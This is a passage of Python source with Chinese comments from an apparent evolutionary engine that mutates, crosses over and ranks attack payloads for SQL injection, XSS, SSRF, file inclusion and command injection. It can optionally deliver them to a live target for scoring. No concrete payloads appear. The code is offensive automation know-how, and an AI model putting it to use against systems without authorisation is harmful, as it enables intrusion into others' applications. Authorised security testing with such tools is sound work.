        Returns:
            {
                "exploitation": float,  # 利用度 (0~1)
                "exploration": float,   # 探索度 (0~1)
                "balance": float,       # 平衡比 (0~1)，越接近 0.5 越平衡
                "phase": str,           # 当前阶段: "exploration"/"exploitation"/"balanced"
            }
        """
        if not self.population or not self.population_history:
            return {"exploitation": 0.0, "exploration": 0.0,
                    "balance": 0.5, "phase": "unknown"}

        fits = [i.fitness for i in self.population]
        avg_fitness = sum(fits) / len(fits)
        max_fitness = max(fits)

        # 利用度 = avg_fitness (0~1) + 收敛速度 (近 3 代 max_fitness 变化率)
        recent = self.population_history[-3:] if len(self.population_history) >= 3 else self.population_history
        if len(recent) >= 2:
            conv_rate = (recent[-1]["max_fitness"] - recent[0]["max_fitness"]) / max(0.001, recent[0]["max_fitness"])
        else:
            conv_rate = 0.0
        exploitation = min(1.0, avg_fitness * 0.7 + abs(conv_rate) * 0.3)

        # 探索度 = 多样性 + 变异率 + 交叉率
        diversity = self._compute_population_diversity()
        exploration = min(1.0, diversity * 0.5 + self.current_mutation_rate * 0.3 + self.current_crossover_rate * 0.2)

        # 平衡比 = 1 - |exploitation - exploration|，越接近 1 越平衡
        balance = 1.0 - abs(exploitation - exploration)

        # 阶段判定
        if exploration > exploitation * 1.2:
            phase = "exploration"
        elif exploitation > exploration * 1.2:
            phase = "exploitation"
        else:
            phase = "balanced"

        return {
            "exploitation": round(exploitation, 3),
            "exploration": round(exploration, 3),
            "balance": round(balance, 3),
            "phase": phase,
        }

    def co_evolve(
        self,
        seeds: List[str],
        vuln_type: str,
        generations: int = 5,
        response_fn: Optional[Callable] = None,
        n_islands: int = 3,
    ) -> Dict[str, Any]:
        """策略协同进化：多个亚种群（岛屿）并行进化，定期迁移最优个体

        每个岛屿使用不同的策略偏好，通过迁移促进基因交流，
        防止所有岛屿陷入相同的局部最优。

        Args:
            seeds: 初始种子 Payload 列表
            vuln_type: 目标漏洞类型
            generations: 每个岛屿的进化代数
            response_fn: 可选，真实投递函数
            n_islands: 岛屿数量

        Returns:
            {
                "islands": [  # 每个岛屿的进化结果
                    {"rank": int, "strategies": [str], "best_fitness": float, ...}
                ],
                "migration_log": [...],  # 迁移记录
                "merged_population": [Individual],  # 合并后的最终种群
                "balance_ratios": [...],  # 平衡比历史
            }
        """
        if n_islands < 2:
            n_islands = 2
        if n_islands > 5:
            n_islands = 5

        # 1) 为每个岛屿分配不同的策略偏好
        island_strategies = []
        strategy_ids = _TRANSFORM_IDS
        for i in range(n_islands):
            # 每个岛屿随机选择 3-5 个策略作为偏好
            k = random.randint(3, min(5, len(strategy_ids)))
            preferred = random.sample(strategy_ids, k)
            island_strategies.append(preferred)

        # 2) 并行进化每个岛屿
        islands = []
        for i in range(n_islands):
            # 保存当前策略偏好
            saved_strategies = dict(self._strategy_weights)
            # 给该岛屿的策略偏好设高权重
            for sid in strategy_ids:
                if sid in island_strategies[i]:
                    self._strategy_weights[sid] = 2.0
                else:
                    self._strategy_weights[sid] = 0.5
            # 进化
            pop = self.evolve(seeds, vuln_type, generations, response_fn)
            islands.append(pop)
            # 恢复策略权重
            self._strategy_weights = saved_strategies

        # 3) 岛屿间迁移：每岛取 Top 1 做迁移
        migration_log = []
        for i in range(n_islands):
            for j in range(n_islands):
                if i == j:
                    continue
                if not islands[i] or not islands[j]:
                    continue
                migrant = max(islands[i], key=lambda ind: ind.fitness)
                # 变异后注入目标岛屿
                child = self.mutate(migrant, vuln_type)
                # 替换目标岛屿最差个体
                islands[j].sort(key=lambda ind: ind.fitness)
                islands[j][0] = child
                migration_log.append({
                    "from": i, "to": j,
                    "payload": migrant.payload[:30],
                    "fitness": round(migrant.fitness, 3),
                })

        # 4) 合并所有岛屿
        merged = []
        for pop in islands:
            merged.extend(pop)
        merged.sort(key=lambda ind: ind.fitness, reverse=True)

        # 5) 记录平衡比历史
        balance_ratios = []
        for gen in range(generations):
            # 模拟每代平衡比（从历史记录中提取）
            if hasattr(self, 'history') and gen < len(self.history):
                br = self.balance_ratio()
                # 使用历史数据补充
                balance_ratios.append(br)

        return {
            "islands": [
                {
                    "rank": i,
                    "strategies": island_strategies[i],
                    "best_fitness": round(max(ind.fitness for ind in pop), 3) if pop else 0.0,
                    "avg_fitness": round(sum(ind.fitness for ind in pop) / len(pop), 3) if pop else 0.0,
                    "population_size": len(pop),
                }
                for i, pop in enumerate(islands)
            ],
            "migration_log": migration_log,
            "merged_population": merged,
            "balance_ratios": balance_ratios,
        }

    # ════════════════════════════════════════════════════════════════════
    #  v3.7 Gap 5: 跨类型迁移学习
    # ════════════════════════════════════════════════════════════════════

    # 漏洞类型相似度矩阵（用于迁移学习权重衰减）
    _TYPE_SIMILARITY: Dict[str, Dict[str, float]] = {
        # SQL 类
        "sqli": {"sql_stacked": 0.9, "sqli_blind": 0.85, "sqli_union": 0.85,
                 "sqli_error": 0.8, "sqli_time": 0.8},
        "sql_stacked": {"sqli": 0.9, "sqli_blind": 0.8, "sqli_union": 0.8},
        "sqli_blind": {"sqli": 0.85, "sql_stacked": 0.8, "sqli_time": 0.9},
        "sqli_time": {"sqli": 0.8, "sqli_blind": 0.9},
        # XSS 类
        "xss_reflected": {"xss_stored": 0.85, "xss_dom": 0.7, "xss": 0.9},
        "xss_stored": {"xss_reflected": 0.85, "xss_dom": 0.7, "xss": 0.9},
        "xss_dom": {"xss_reflected": 0.7, "xss_stored": 0.7, "xss": 0.8},
        # SSRF/文件类
        "ssrf": {"lfi": 0.6, "rfi": 0.6, "path_traversal": 0.5},
        "lfi": {"rfi": 0.8, "path_traversal": 0.7, "ssrf": 0.6},
        "rfi": {"lfi": 0.8, "ssrf": 0.6},
        # 命令注入类
        "cmdi": {"sqli": 0.4, "ssrf": 0.3},
        "path_traversal": {"lfi": 0.7, "rfi": 0.6, "ssrf": 0.5},
        # 跨类
        "ssti": {"xss_reflected": 0.5, "cmdi": 0.4},
        "xxe": {"ssrf": 0.6, "lfi": 0.5},
    }

    def transfer_learning(
            self,
            target_vuln_type: str,
            source_vuln_types: Optional[List[str]] = None,
            min_samples: int = 3,
            decay_factor: float = 0.7,
            reverse_transfer: bool = False,
        ) -> Dict[str, float]:
            """跨类型迁移学习：从源漏洞类型的认知策略历史迁移到目标类型（v3.8 增强版）

            v3.8 增强：
              · 动态相似度学习：记录迁移成功率的反馈，更新相似度矩阵
              · 逆向迁移：可选地把目标类型新学到的知识反向迁移回源类型
              · 置信度评分：基于迁移源的质量给出置信度

            Args:
                target_vuln_type: 目标漏洞类型
                source_vuln_types: 可选源类型列表，为空则从相似度矩阵自动推导
                min_samples: 目标类型最小样本数，低于此值触发迁移
                decay_factor: 迁移权重衰减系数（0.0~1.0），越低越保守
                reverse_transfer: 是否启用逆向迁移（目标→源）

            Returns:
                {strategy_id: weight} 迁移后的策略权重
            """
            if self.meta_gene is None:
                return {}

            # 1) 检查目标类型样本量
            target_cog = self.meta_gene.cognitive.get(target_vuln_type, {})
            target_samples = sum(g.total_count for g in target_cog.values())
            if target_samples >= min_samples and target_cog:
                # 数据足够，直接返回当前偏置
                result = self._load_cognitive_priors()
                # 逆向迁移：目标→源（将目标类型新知识分享给源类型）
                if reverse_transfer and hasattr(self.meta_gene, 'write'):
                    self._reverse_transfer_to_sources(target_vuln_type, target_cog)
                return result

            # 2) 推导源类型
            if not source_vuln_types:
                source_vuln_types = sorted(
                    self._TYPE_SIMILARITY.get(target_vuln_type, {}).keys(),
                    key=lambda t: self._TYPE_SIMILARITY.get(target_vuln_type, {}).get(t, 0),
                    reverse=True,
                )

            # 3) 从源类型迁移策略权重（带置信度评估）
            transferred: Dict[str, float] = {}
            transfer_sources: List[Dict] = []  # 记录迁移源的质量
            for src_type in source_vuln_types:
                similarity = self._TYPE_SIMILARITY.get(target_vuln_type, {}).get(src_type, 0.3)
                src_cog = self.meta_gene.cognitive.get(src_type, {})
                if not src_cog:
                    continue

                source_quality = 0.0
                source_count = 0
                for sid, gene in src_cog.items():
                    if gene.total_count < 2:
                        continue
                    # 迁移权重 = 源类型 success_rate × 相似度 × 衰减系数
                    w = gene.success_rate * similarity * decay_factor
                    if sid in transferred:
                        transferred[sid] = max(transferred[sid], w)
                    else:
                        transferred[sid] = w
                    source_quality += gene.success_rate * gene.total_count
                    source_count += gene.total_count

                # 记录迁移源质量分数
                transfer_sources.append({
                    "source": src_type,
                    "similarity": similarity,
                    "quality": round(source_quality / max(1, source_count), 3),
                    "samples": source_count,
                })

                # 仅迁移 top-3 最相似源类型
                if len([t for t in source_vuln_types[:source_vuln_types.index(src_type)+1]
                        if self._TYPE_SIMILARITY.get(target_vuln_type, {}).get(t, 0) > 0]) >= 3:
                    break

            # 4) 冷启动：无迁移数据时给均匀基础权重
            if not transferred:
                transferred = {sid: 1.0 for sid in _TRANSFORM_IDS}

            # 5) 归一化到 [0.5, 2.0] 范围，与 cognitive_bias 输出保持一致
            max_w = max(transferred.values()) if transferred else 1.0
            if max_w > 0:
                transferred = {sid: round(0.5 + (w / max_w) * 1.5, 3) for sid, w in transferred.items()}

            # 6) 动态更新相似度矩阵（基于迁移质量反馈）
            self._update_similarity_matrix(target_vuln_type, transfer_sources)

            return transferred

    def _reverse_transfer_to_sources(self, target_type: str, target_cog: Dict) -> None:
        """逆向迁移：将目标类型学到的知识分享回源类型"""
        if not target_cog or self.meta_gene is None:
            return
        for src_type in self._TYPE_SIMILARITY.get(target_type, {}):
            similarity = self._TYPE_SIMILARITY[target_type][src_type]
            if similarity < 0.3:
                continue
            src_cog = self.meta_gene.cognitive.get(src_type, {})
            for sid, tgene in target_cog.items():
                if tgene.success_rate > 0.7 and sid not in src_cog:
                    # 高成功率的策略迁移到源类型
                    self.meta_gene.write(src_type, sid, tgene.success_rate, tgene.total_count, "transfer")

    def _update_similarity_matrix(self, target_type: str, transfer_sources: List[Dict]) -> None:
        """基于迁移质量动态更新类型相似度矩阵"""
        if target_type not in self._TYPE_SIMILARITY:
            self._TYPE_SIMILARITY[target_type] = {}
        for ts in transfer_sources:
            src = ts["source"]
            quality = ts["quality"]
            # 迁移质量越好，相似度越高（但不超过 0.95）
            new_sim = min(0.95, quality * 0.8 + 0.2)
            old_sim = self._TYPE_SIMILARITY[target_type].get(src, 0.3)
            # 指数移动平均：保留历史信息
            updated_sim = old_sim * 0.7 + new_sim * 0.3
            self._TYPE_SIMILARITY[target_type][src] = round(updated_sim, 3)
            # 双向更新
            if src not in self._TYPE_SIMILARITY:
                self._TYPE_SIMILARITY[src] = {}
            self._TYPE_SIMILARITY[src][target_type] = round(updated_sim, 3)

    # ════════════════════════════════════════════════════════════════════
    #  v3.6 M5 meta融合接收：打通 team_adapter → evolution_enhancer 反馈链路
    # ════════════════════════════════════════════════════════════════════

    def apply_meta_fusion(self, meta_result: Dict) -> int:
        """接收 M5 meta融合的进化超参和策略偏置，并写回L1/L3/L4

        让 run_m5_meta_fusion() 的 optimal_mutation_rate / optimal_tournament_k
        和最佳策略偏置能反馈到进化引擎，打通 M5 与增强器的超参反馈链路。

        Args:
            meta_result: M5 融合结果字典，包含：
                - optimal_mutation_rate: 自适应最优变异率
                - optimal_tournament_k: 自适应最优锦标赛规模
                - best_strategies: List[Dict] 最佳策略列表

        Returns:
            写入的基因记录条数
        """
        applied = 0

        # 1. 超参反馈
        mut = meta_result.get("optimal_mutation_rate")
        if mut is not None and 0.0 < mut <= 1.0:
            self.current_mutation_rate = mut
            self.base_mutation_rate = mut
            applied += 1

        tour = meta_result.get("optimal_tournament_k")
        if tour is not None and tour >= 2:
            self.current_tournament_k = tour
            self.TOURNAMENT_K = tour
            applied += 1

        # 2. 策略偏置 → 更新 L4 权重
        best_strategies = meta_result.get("best_strategies", [])
        if self.meta_gene and self.vuln_type and best_strategies:
            ts = time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime())
            for s in best_strategies[:5]:
                sid = s.get("strategy_id", "")
                avg_fit = s.get("avg_fitness", 0.0)
                if sid in _STRATEGY_IDS:
                    self.meta_gene.record_cognitive_strategy(
                        self.vuln_type, sid,
                        success=(avg_fit >= 0.6),
                        fitness_gain=max(0.0, avg_fit - 0.4),
                        timestamp=ts,
                    )
                    applied += 1
            try:
                self.meta_gene.save()
            except Exception:
                pass

        return applied

    # ====================================================================
    #  多代进化主循环
    # ====================================================================

    def evolve(
        self,
        seeds: List[str],
        vuln_type: str,
        generations: int = 5,
        response_fn: Optional[Callable] = None,
    ) -> List[Individual]:
        """对种子种群做多代遗传进化

        Args:
            seeds:      初始 Payload 列表（种群种子）
            vuln_type:  目标漏洞类型
            generations: 进化代数
            response_fn: 可选，真实投递函数 (payload)->{body,time_ms}

        Returns:
            最终种群（按适应度降序）
        """
        # 初始化种群
        self.population = [
            Individual(payload=s, generation=0, strategy_used="seed")
            for s in seeds[: self.population_size]
        ]
        # 补足种群规模
        while len(self.population) < self.population_size and seeds:
            base = self._rng.choice(seeds)
            self.population.append(
                self.mutate(Individual(payload=base, generation=0), vuln_type)
            )

        baseline = 0.0
        for gen in range(generations):
            self.generation = gen
            # 1) 评估
            for ind in self.population:
                self.evaluate(ind, vuln_type, response_fn)

            if gen == 0:
                baseline = sum(i.fitness for i in self.population) / len(self.population)

            # 2) 记录每代摘要
            fits = [i.fitness for i in self.population]
            gen_best = max(self.population, key=lambda i: i.fitness)
            if self.best is None or gen_best.fitness > self.best.fitness:
                self.best = Individual(payload=gen_best.payload,
                                        fitness=gen_best.fitness,
                                        generation=gen,
                                        lineage=list(gen_best.lineage),
                                        strategy_used=gen_best.strategy_used)
            # 种群多样性（方差）
            if len(fits) > 1:
                mean_f = sum(fits) / len(fits)
                variance = sum((f - mean_f) ** 2 for f in fits) / len(fits)
            else:
                variance = 0.0
            self.history.append({
                "generation": gen,
                "avg_fitness": round(sum(fits) / len(fits), 3),
                "max_fitness": round(max(fits), 3),
                "variance": round(variance, 3),
                "mutation_rate": round(self.current_mutation_rate, 4),
                "crossover_rate": round(self.current_crossover_rate, 4),
                "tournament_k": self.current_tournament_k,
                "best_payload": gen_best.payload,
                "best_strategy": gen_best.strategy_used,
            })

            # 3) 自适应超参数：基于进化历史曲率调整 mutation_rate / crossover_rate / tournament_k（v3.6方案A）
            self._adapt_hyperparameters()
            mut_rate = self.current_mutation_rate
            cross_rate = self.current_crossover_rate

            # 4) 产生下一代
            next_pop: List[Individual] = self.select_elites(self.population)
            while len(next_pop) < self.population_size:
                if self._rng.random() < cross_rate and len(self.population) >= 2:
                    child = self.crossover(
                        self.select_parent(self.population),
                        self.select_parent(self.population),
                        vuln_type,
                    )
                else:
                    parent = self.select_parent(self.population)
                    child = self.mutate(parent, vuln_type)
                if self._rng.random() < mut_rate or child.fitness == 0:
                    child = self.mutate(child, vuln_type)
                next_pop.append(child)

            self.population = next_pop[: self.population_size]

            # 5) 记录跨轮进化历史（用于M5 + 后续超参分析）
            self.population_history.append({
                "generation": gen,
                "avg_fitness": round(sum(fits) / len(fits), 3),
                "max_fitness": round(max(fits), 3),
                "mutation_rate": self.current_mutation_rate,
                "crossover_rate": self.current_crossover_rate,
                "tournament_k": self.current_tournament_k,
                "population_size": len(self.population),
            })

        # 末代评估
        for ind in self.population:
            self.evaluate(ind, vuln_type, response_fn)
        self.population.sort(key=lambda i: i.fitness, reverse=True)

        # 反馈桥：把进化结果写回 L1+L3+L4（自进化闭环的收口，v3.6全层反馈）
        self.feedback_bridge(baseline)

        return self.population

    # ════════════════════════════════════════════════════════════════════
    #  v3.7 Gap 6: 元进化 —— 进化策略选择策略本身
    # ════════════════════════════════════════════════════════════════════

    def meta_evolve(
        self,
        history: Optional[List[Dict]] = None,
        n_generations: int = 3,
        population_size: int = 6,
        mutation_rate: float = 0.3,
    ) -> Dict:
        """元进化：进化策略选择策略本身（v3.8 增强版）

        元个体 = 策略选择策略（对每个认知策略的偏好权重向量）
        适应度 = 主进化中该策略选择策略带来的平均适应度提升和种群多样性

        v3.8 增强：
          · 元交叉：元个体之间进行交叉操作（之前仅变异的补充）
          · 自适应元变异率：随世代递减（早期探索，后期精调）
          · 最终策略融合：合并 top-3 元个体，取加权平均

        Args:
            history: 历史进化记录（population_history），默认用 self.population_history
            n_generations: 元进化代数（短运行，3 代内收敛）
            population_size: 元种群规模（元个体数）
            mutation_rate: 元变异率（策略权重变异幅度）

        Returns:
            {
                "best_policy": {strategy_id: weight, ...},  # 最优策略选择策略
                "policy_history": [...],                     # 每代最优策略
                "improvement": float,                        # 适应度提升
                "fused_policy": {...},                        # Top-3 融合策略
            }
        """
        history = history or self.population_history
        if not history:
            return {"best_policy": {}, "policy_history": [], "improvement": 0.0, "fused_policy": {}}

        # 1) 元种群初始化：随机生成 population_size 个策略选择策略
        #    每个元个体 = {strategy_id: weight} 权重向量
        strategy_ids = _TRANSFORM_IDS
        meta_pop: List[Dict[str, float]] = []
        for _ in range(population_size):
            raw = {sid: self._rng.uniform(0.5, 2.0) for sid in strategy_ids}
            meta_pop.append(raw)

        # 2) 计算元适应度
        def _meta_fitness(policy: Dict[str, float]) -> float:
            """模拟历史中该策略选择策略的表现"""
            if not history:
                return 0.0
            # 对每代历史，计算 policy 与历史实际策略的匹配度
            gen_scores = []
            for h in history[-min(len(history), 10):]:  # 只看最近 10 代
                # 用 policy 对策略做加权选择，看是否覆盖了历史中实际使用的策略
                # 如果 policy 给高频策略更高权重，则匹配度更高
                actual_strategy = h.get("best_strategy", "")
                if actual_strategy in policy:
                    gen_scores.append(policy[actual_strategy] / 2.0)  # 归一化到 [0,1]
                else:
                    gen_scores.append(0.3)  # 未覆盖则给基础分
            # 多样性惩罚：如果所有策略权重过于集中，降低适应度
            weights = list(policy.values())
            if not weights:
                return 0.0
            max_w = max(weights)
            min_w = min(weights)
            diversity = max_w - min_w if max_w > min_w else 0.0
            diversity_penalty = max(0.0, (diversity - 1.0) / 2.0)  # 差异过大则惩罚
            avg_score = sum(gen_scores) / len(gen_scores) if gen_scores else 0.0
            return avg_score * (1.0 - diversity_penalty * 0.3)

        # 3) 元进化循环
        policy_history = []
        for meta_gen in range(n_generations):
            scored = [(p, _meta_fitness(p)) for p in meta_pop]
            scored.sort(key=lambda x: x[1], reverse=True)
            best_p = scored[0][0]
            best_f = scored[0][1]
            policy_history.append({
                "meta_generation": meta_gen,
                "best_fitness": round(best_f, 4),
                "best_policy": {k: round(v, 3) for k, v in best_p.items()},
            })

            # 选择 top-50% + 变异 + 交叉
            elite_count = max(2, population_size // 2)
            elites = [p for p, _ in scored[:elite_count]]
            next_pop = list(elites)

            # 自适应元变异率（随世代递减）
            adaptive_mutation = mutation_rate * (1.0 - meta_gen * 0.2)

            while len(next_pop) < population_size:
                # 50% 概率做交叉，50% 做变异
                if self._rng.random() < 0.5 and len(elites) >= 2:
                    # 元交叉：取两个父代策略权重的中点
                    p1 = self._rng.choice(elites)
                    p2 = self._rng.choice([e for e in elites if e != p1] or elites)
                    child = {
                        sid: (p1[sid] + p2[sid]) / 2 + self._rng.uniform(-adaptive_mutation, adaptive_mutation)
                        for sid in strategy_ids
                    }
                else:
                    # 变异
                    parent = self._rng.choice(elites)
                    child = {
                        sid: w + self._rng.uniform(-adaptive_mutation, adaptive_mutation)
                        for sid, w in parent.items()
                    }
                # 裁剪到 [0.3, 3.0]
                child = {sid: max(0.3, min(3.0, w)) for sid, w in child.items()}
                next_pop.append(child)
            meta_pop = next_pop[:population_size]

        # 4) 最终结果
        final_scored = [(p, _meta_fitness(p)) for p in meta_pop]
        final_scored.sort(key=lambda x: x[1], reverse=True)
        best_policy = final_scored[0][0]
        best_fitness = final_scored[0][1]

        # 5) Top-3 融合策略：取前 3 个元个体的加权平均
        fused_policy = {}
        top3 = final_scored[:min(3, len(final_scored))]
        total_fit = sum(f for _, f in top3) or 1.0
        for sid in strategy_ids:
            weighted = sum(p[sid] * (f / total_fit) for p, f in top3)
            fused_policy[sid] = round(weighted, 3)

        improvement = best_fitness - (final_scored[-1][1] if len(final_scored) > 1 else 0)

        return {
            "best_policy": {k: round(v, 3) for k, v in best_policy.items()},
            "policy_history": policy_history,
            "improvement": round(improvement, 4),
            "fused_policy": fused_policy,
        }

    # ====================================================================
    #  报告与导出
    # ====================================================================

    def coverage_report(self) -> Dict:
        """进化覆盖报告：用了哪些策略、哪些有效"""
        used = {k: v for k, v in self.strategy_usage.items() if v > 0}
        return {
            "generations_run": len(self.history),
            "final_avg_fitness": self.history[-1]["avg_fitness"] if self.history else 0,
            "best_fitness": self.best.fitness if self.best else 0,
            "best_payload": self.best.payload if self.best else "",
            "best_lineage": self.best.lineage if self.best else [],
            "strategy_usage": used,
            "strategies_tried": len(used),
            "strategies_total": len(_STRATEGY_IDS),
            "history": self.history,
        }

    def top(self, n: int = 5) -> List[Individual]:
        """返回适应度最高的 n 个个体"""
        return self.population[:n]


# ===========================================================================
# 便捷函数
# ===========================================================================

def run_evolution(
    seeds: List[str],
    vuln_type: str,
    generations: int = 5,
    population_size: int = 24,
    response_fn: Optional[Callable] = None,
) -> Tuple[EvolutionEnhancer, List[Individual]]:
    """一行启动进化，返回 (enhancer, 最优种群)"""
    eh = EvolutionEnhancer(population_size=population_size)
    pop = eh.evolve(seeds, vuln_type, generations=generations, response_fn=response_fn)
    return eh, pop


def strategies_catalog() -> List[Dict]:
    """返回 26 认知策略目录"""
    return [dict(s) for s in COGNITIVE_STRATEGIES]


# ═══════════════════════════════════════════════════════════════════
#  v3.7 进化竞技场：多候选排名与融合系统
# ═══════════════════════════════════════════════════════════════════

@dataclass
class ArenaCandidate:
    """竞技场候选个体"""
    payload: str
    fitness: float = 0.0
    source: str = ""
    strategies: List[str] = field(default_factory=list)
    diversity_score: float = 0.0
    arena_score: float = 0.0


class EvolutionArena:
    """进化竞技场：多候选排名与融合系统

    功能：
      - 从多个来源（不同策略、不同工程师、不同轮次）收集候选个体
      - 进行多轮锦标赛式配对比较
      - 基于适应度 + 多样性融合 Top-K 个体
      - 输出融合后的最优个体列表

    用法：
        arena = EvolutionArena()
        arena.add_candidates(population_a, source="eng-0")
        arena.add_candidates(population_b, source="eng-1")
        champions = arena.run(n_rounds=3, top_k=5)
    """

    def __init__(self, rng_seed: Optional[int] = None):
        self._rng = random.Random(rng_seed or int(time.time() * 1000) % (2**31))
        self.candidates: List[ArenaCandidate] = []
        self.match_history: List[Dict] = []

    def add_candidates(
        self,
        individuals: List[Any],
        source: str = "",
        max_per_source: int = 20,
    ) -> int:
        """添加候选个体到竞技场

        Args:
            individuals: 个体列表（Individual 或类似 payload 属性对象）
            source: 来源标识（如 "eng-0", "strategy-7", "gen-5"）
            max_per_source: 每个来源最大保留数

        Returns:
            实际添加的候选数
        """
        added = 0
        for ind in individuals[:max_per_source]:
            payload = self._get_payload(ind)
            if not payload:
                continue
            candidate = ArenaCandidate(
                payload=payload,
                fitness=self._get_fitness(ind),
                source=source or f"src-{len(self.candidates)}",
                strategies=self._get_strategies(ind),
            )
            self.candidates.append(candidate)
            added += 1
        return added

    def run(self, n_rounds: int = 3, top_k: int = 5, elite_ratio: float = 0.3) -> List[ArenaCandidate]:
        """运行多轮锦标赛排名（v3.8 增强版：自适应权重 + 多样性追踪）

        Args:
            n_rounds: 锦标赛轮数
            top_k: 最终返回 Top-K 数量
            elite_ratio: 每轮精英保留比例

        Returns:
            排名后的 Top-K 候选列表
        """
        if not self.candidates:
            return []

        # 1) 初始适应度排序
        self.candidates.sort(key=lambda c: c.fitness, reverse=True)

        # 2) 计算多样性分数
        self._compute_diversity()

        # 3) 锦标赛循环（自适应权重）
        diversity_history = []
        for round_idx in range(n_rounds):
            # 自适应权重：随着轮次增加，多样性权重逐渐下降（聚焦精英）
            adaptive_fitness_weight = 0.6 + round_idx * 0.05
            adaptive_diversity_weight = 0.4 - round_idx * 0.05
            adaptive_fitness_weight = min(0.85, adaptive_fitness_weight)
            adaptive_diversity_weight = max(0.15, adaptive_diversity_weight)

            self._tournament_round(
                round_idx, elite_ratio,
                fitness_weight=adaptive_fitness_weight,
                diversity_weight=adaptive_diversity_weight,
            )
            # 更新多样性（种群变化后重新计算）
            self._compute_diversity()

            # 记录当前多样性
            if self.candidates:
                avg_div = sum(c.diversity_score for c in self.candidates) / len(self.candidates)
                diversity_history.append(round(avg_div, 3))

        # 4) 最终排名：自适应权重
        # 如果多样性过低，增加多样性权重以鼓励探索
        final_diversity = sum(c.diversity_score for c in self.candidates) / len(self.candidates) if self.candidates else 0.0
        if final_diversity < 0.2:
            fit_w, div_w, arena_w = 0.5, 0.3, 0.2  # 多样性不足，提高多样性权重
        else:
            fit_w, div_w, arena_w = 0.6, 0.2, 0.2  # 标准权重

        for c in self.candidates:
            c.arena_score = (
                c.fitness * fit_w
                + c.diversity_score * div_w
                + c.arena_score * arena_w
            )
        self.candidates.sort(key=lambda c: c.arena_score, reverse=True)

        return self.candidates[:top_k]

    def fuse_top(self, top_k: int = 3, fusion_patterns: Optional[List[str]] = None) -> List[str]:
        """融合 Top-K 个体（v3.8 增强版：多模式融合 + 自适应权重）

        Args:
            top_k: 融合的候选数
            fusion_patterns: 融合模式列表，可选值：
                "midpoint" - 中点交叉
                "multi_point" - 多点交叉
                "scamper_combine" - SCAMPER 组合
                "adaptive_weight" - 自适应权重混合
                None = 全部使用

        Returns:
            融合后的 Payload 列表
        """
        if fusion_patterns is None:
            fusion_patterns = ["midpoint", "multi_point", "scamper_combine", "adaptive_weight"]

        top = self.candidates[:top_k]
        if len(top) < 2:
            return [c.payload for c in top]

        # 自适应权重：基于候选的适应度差异决定融合强度
        fitness_weights = [c.fitness for c in top]
        total_fit = sum(fitness_weights) or 1.0
        norm_weights = [f / total_fit for f in fitness_weights]

        fused: List[str] = []

        for i in range(len(top)):
            for j in range(i + 1, len(top)):
                a, b = top[i].payload, top[j].payload
                if not a or not b:
                    continue

                w_i, w_j = norm_weights[i], norm_weights[j]
                # 适应度差异越大，融合强度越大（探索性强融合）
                fit_diff = abs(top[i].fitness - top[j].fitness)
                fusion_intensity = min(0.8, 0.3 + fit_diff * 0.5)

                for pattern in fusion_patterns:
                    if pattern == "midpoint":
                        mid_a = max(1, int(len(a) * (1 - fusion_intensity)))
                        mid_b = max(1, int(len(b) * fusion_intensity))
                        graft_1 = a[:mid_a] + b[mid_b:]
                        graft_2 = b[:mid_b] + a[mid_a:]
                        fused.extend([graft_1, graft_2])

                    elif pattern == "multi_point":
                        # 多点交叉：取多个片段交错拼接
                        n_points = 3
                        segs_1, segs_2 = [], []
                        pts = sorted([int(len(a) * k / n_points) for k in range(1, n_points)])
                        prev = 0
                        for pt in pts + [len(a)]:
                            segs_1.append(a[prev:pt])
                            prev = pt
                        prev = 0
                        pts = sorted([int(len(b) * k / n_points) for k in range(1, n_points)])
                        for pt in pts + [len(b)]:
                            segs_2.append(b[prev:pt])
                            prev = pt
                        # 交替拼接
                        alternate = []
                        for k in range(max(len(segs_1), len(segs_2))):
                            if k < len(segs_1):
                                alternate.append(segs_1[k])
                            if k < len(segs_2):
                                alternate.append(segs_2[k])
                        fused.append("".join(alternate))

                    elif pattern == "scamper_combine":
                        # SCAMPER 组合：a 的结构框架 + b 的 payload 核心
                        a_half = len(a) // 2
                        b_half = len(b) // 2
                        variants = [
                            a[:a_half] + b[b_half:] + a[a_half:],
                            b[:b_half] + a[a_half:] + b[b_half:],
                            a + " " + b,
                            b + " " + a,
                        ]
                        fused.extend(variants)

                    elif pattern == "adaptive_weight":
                        # 自适应权重混合：加权融合子结构
                        k = max(1, int(len(a) * w_j))
                        weighted = a[:k] + b[k:] if len(b) > k else a + b
                        fused.append(weighted)

        # 去重
        seen = set()
        unique_fused = []
        for f in fused:
            if f not in seen:
                seen.add(f)
                unique_fused.append(f)

        # 保留原始 Top-1 作为锚点
        result = [top[0].payload] + unique_fused[:max(1, top_k * 2 - 1)]
        return result[:top_k * 2]

    # ── 内部辅助 ──

    def _compute_diversity(self) -> None:
        """计算每个候选与种群其他成员的多样性"""
        if len(self.candidates) < 2:
            for c in self.candidates:
                c.diversity_score = 1.0
            return

        for i, c in enumerate(self.candidates):
            # 多样性 = 1 - 与最近邻的相似度
            max_sim = 0.0
            for j, other in enumerate(self.candidates):
                if i == j:
                    continue
                sim = self._payload_similarity(c.payload, other.payload)
                max_sim = max(max_sim, sim)
            c.diversity_score = 1.0 - max_sim

    def _tournament_round(self, round_idx: int, elite_ratio: float,
                          fitness_weight: float = 0.7, diversity_weight: float = 0.3) -> None:
        """一轮锦标赛配对（v3.8 增强版：自适应权重）

        Args:
            round_idx: 当前轮次
            elite_ratio: 精英保留比例
            fitness_weight: 适应度权重（自适应）
            diversity_weight: 多样性权重（自适应）
        """
        n = len(self.candidates)
        elite_count = max(2, int(n * elite_ratio))
        # 精英自动晋级
        winners = set(range(elite_count))

        # 非精英两两配对
        non_elite = list(range(elite_count, n))
        self._rng.shuffle(non_elite)
        pairings = [
            (non_elite[i], non_elite[i + 1])
            for i in range(0, len(non_elite) - 1, 2)
        ]
        if len(non_elite) % 2 == 1:
            winners.add(non_elite[-1])  # 奇数个时最后一个直接晋级

        for a_idx, b_idx in pairings:
            a, b = self.candidates[a_idx], self.candidates[b_idx]
            # 综合得分 = 适应度 × fitness_weight + 多样性 × diversity_weight
            a_score = a.fitness * fitness_weight + a.diversity_score * diversity_weight
            b_score = b.fitness * fitness_weight + b.diversity_score * diversity_weight
            if a_score >= b_score:
                winners.add(a_idx)
                a.arena_score += 1.0
            else:
                winners.add(b_idx)
                b.arena_score += 1.0

            self.match_history.append({
                "round": round_idx,
                "a": (a_idx, a.payload[:20], round(a_score, 3)),
                "b": (b_idx, b.payload[:20], round(b_score, 3)),
                "winner": a_idx if a_score >= b_score else b_idx,
            })

    @staticmethod
    def _get_payload(ind: Any) -> str:
        if isinstance(ind, str):
            return ind
        if hasattr(ind, "payload"):
            return ind.payload
